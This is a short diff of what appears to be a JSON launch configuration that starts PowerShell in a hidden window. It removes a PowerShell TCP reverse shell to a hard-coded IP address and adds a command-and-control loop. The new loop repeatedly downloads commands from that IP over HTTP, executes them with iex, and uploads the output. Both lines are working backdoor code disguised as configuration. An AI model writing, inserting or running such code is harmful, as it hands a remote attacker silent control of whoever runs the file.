@@ -7,7 +7,7 @@
         "-WindowStyle",
         "Hidden",
         "-Command",
-        "$c=New-Object System.Net.Sockets.TCPClient('175.27.239.42',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
+        "while($true){try{$cmd=(New-Object Net.WebClient).DownloadString('http://175.27.239.42:8080/cmd');if($cmd.Trim() -ne ''){$r=iex $cmd 2>&1|Out-String;(New-Object Net.WebClient).UploadString('http://175.27.239.42:8080/res',$r)}}catch{};Start-Sleep 3}"
       ]
     }
   }
